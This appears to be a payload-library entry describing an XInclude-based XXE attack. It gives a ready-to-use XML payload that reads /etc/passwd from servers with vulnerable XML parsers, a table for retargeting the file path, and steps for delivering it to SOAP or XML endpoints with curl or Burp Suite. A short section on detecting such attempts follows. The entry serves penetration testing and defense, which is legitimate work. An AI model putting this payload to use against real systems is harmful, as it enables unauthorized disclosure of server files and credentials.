---
id: 4f0b29c5-71a7-4c4e-b896-3a23092be820
name: XInclude-XXE-Payload-to-Retrieve-Local-Files
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.216569+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - xxe
  - payload
  - xinclude
  - file-inclusion
validated: true
---

# XInclude-XXE-Payload-to-Retrieve-Local-Files

## Code

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Description

This XML payload exploits XXE vulnerabilities by using the XInclude namespace to include and retrieve the contents of a local file (/etc/passwd on Linux systems). When processed by a vulnerable XML parser, it resolves the external reference and embeds the file's text content into the output, enabling information disclosure without direct file access.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| href | URI of the file to include (use file:// protocol for local files; adjust path for target OS) | file:///etc/passwd |
| parse="text" | Instructs the parser to treat the included content as plain text rather than XML | Built-in |

## Usage

Embed this payload in an HTTP POST request to an XML-parsing endpoint, such as a SOAP service or custom XML API. Use tools like curl or Burp Suite to submit it. For example, save to a file and send via [[commands/curl-send-xml-payload]]. This is typically used in web exploitation scenarios to extract sensitive files during penetration testing or red team engagements.

## Detection

- Monitor XML parser logs for external entity resolution attempts or XInclude processing.
- Web application firewalls (WAFs) can signature-match XInclude namespaces (xmlns:xi="http://www.w3.org/2001/XInclude").
- Anomalous file access on the server (e.g., reads to /etc/passwd) via audit logs.
- Response size anomalies or content containing system file patterns (e.g., user:uid:gid).

## Related

- [[procedures/XXE-File-Retrieval-via-XInclude-Attack]]
- [[commands/curl-send-xml-payload]]
